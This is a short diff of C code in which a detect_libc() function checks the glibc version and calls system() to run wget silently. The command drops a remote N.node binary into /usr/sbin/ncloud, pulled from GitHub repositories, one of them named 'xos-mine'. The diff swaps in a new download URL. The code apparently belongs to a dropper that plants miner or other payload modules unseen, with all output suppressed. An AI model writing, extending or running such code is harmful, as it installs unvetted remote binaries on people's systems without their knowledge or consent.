@@ -69,7 +69,7 @@ void detect_libc() {
             } else if (strstr(buffer, "2.31-0ubuntu9.7")) {
                 system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/nbwg/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
             } else if (strstr(buffer, "2.36-9+deb12u10")) {
-                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/nbwr/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
+                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/x011-al/tesb/raw/refs/heads/main/N.node >/dev/null 2>&1");
             } 
         }
     }
